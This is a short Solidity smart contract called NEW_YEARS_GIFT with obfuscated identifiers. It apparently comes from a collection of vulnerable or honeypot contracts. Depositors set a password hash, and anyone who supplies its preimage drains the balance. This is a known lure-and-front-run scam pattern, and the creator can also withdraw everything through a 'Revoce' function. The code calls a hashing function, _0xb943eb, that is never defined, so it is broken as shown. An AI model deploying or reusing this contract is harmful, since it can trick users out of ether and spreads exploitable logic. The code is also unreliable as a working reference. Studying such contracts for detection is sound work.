pragma solidity ^0.4.19;

contract NEW_YEARS_GIFT
{
    string _0x754e3d;

    bool _0x654b43 = false;

    address sender;

    bytes32 public _0x8c1136;

    function() public payable{}

    function GetHash(bytes _0x49273b) public constant returns (bytes32) {return _0xb943eb(_0x49273b);}

    function SetPass(bytes32 _0xd2ab07)
    public
    payable
    {
        if( (!_0x654b43&&(msg.value > 1 ether)) || _0x8c1136==0x0 )
        {
            _0x8c1136 = _0xd2ab07;
            sender = msg.sender;
        }
    }

    function SetMessage(string _0x424e07)
    public
    {
        if(msg.sender==sender)
        {
            _0x754e3d =_0x424e07;
        }
    }

    function GetGift(bytes _0x49273b)
    external
    payable
    returns (string)
    {
        if(_0x8c1136 == _0xb943eb(_0x49273b))
        {
            msg.sender.transfer(this.balance);
            return _0x754e3d;
        }
    }

    function Revoce()
    public
    payable
    {
        if(msg.sender==sender)
        {
            sender.transfer(this.balance);
            _0x754e3d="";
        }
    }

    function PassHasBeenSet(bytes32 _0xd2ab07)
    public
    {
        if(msg.sender==sender&&_0xd2ab07==_0x8c1136)
        {
           _0x654b43=true;
        }
    }
}